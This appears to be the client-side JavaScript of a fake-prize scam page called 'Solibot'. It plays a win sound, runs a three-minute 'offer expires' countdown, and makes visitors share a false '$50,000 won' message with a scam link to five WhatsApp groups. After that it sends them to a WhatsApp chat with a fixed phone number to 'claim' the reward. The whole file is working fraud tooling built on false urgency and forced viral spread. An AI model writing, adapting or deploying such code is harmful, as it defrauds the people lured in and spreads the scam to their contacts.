document.addEventListener("DOMContentLoaded", () => {
  const popup = document.getElementById("popup");
  const shareBtn = document.getElementById("shareBtn");
  const activation = document.getElementById("activation");
  const activateBtn = document.getElementById("activateBtn");
  const winSound = document.getElementById("winSound");
  const countdownTimer = document.getElementById("countdownTimer");

  popup.classList.remove("hidden");
  winSound.play();
  startCountdown(180); // 3-minute timer

  let shareCount = 0;

  // Share button logic
  shareBtn.addEventListener("click", () => {
    if (shareCount < 5) {
      shareToWhatsApp();
      shareCount++;
      alert(`Shared with group ${shareCount}. Share with ${5 - shareCount} more group(s).`);
    }
    if (shareCount === 5) {
      alert("Thank you for sharing! Proceed to activate your prize.");
      popup.classList.add("hidden");
      activation.classList.remove("hidden");
    }
  });

  // WhatsApp share function
  function shareToWhatsApp() {
    const message = encodeURIComponent("I won $50,000 through Solibot! Click to claim your prize: https://unitedstateofamerica.github.io/solibot-site/");
    const whatsappLink = `https://wa.me/?text=${message}`;
    window.open(whatsappLink, "_blank");
  }

  // WhatsApp activation button logic
  activateBtn.addEventListener("click", () => {
    const whatsappLink = `https://wa.me/2349118924274?text=Hello%2C%20I%27m%20here%20to%20claim%20my%20$50%2C000%20Solibot%20reward!`;
    window.open(whatsappLink, "_blank");
  });

  // Countdown timer function
  function startCountdown(duration) {
    let timer = duration;
    const interval = setInterval(() => {
      let minutes = Math.floor(timer / 60);
      let seconds = timer % 60;
      countdownTimer.textContent = `Offer expires in: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
      timer--;
      if (timer < 0) {
        clearInterval(interval);
        countdownTimer.textContent = "Offer expired.";
        shareBtn.disabled = true;
      }
    }, 1000);
  }
});

function shareToWhatsApp() {
  const message = encodeURIComponent("I won $50,000 through Solibot! Click to claim your prize: https://yourwebsiteurl.com");
  const whatsappLink = `https://wa.me/?text=${message}`;
  window.open(whatsappLink, "_blank");
}
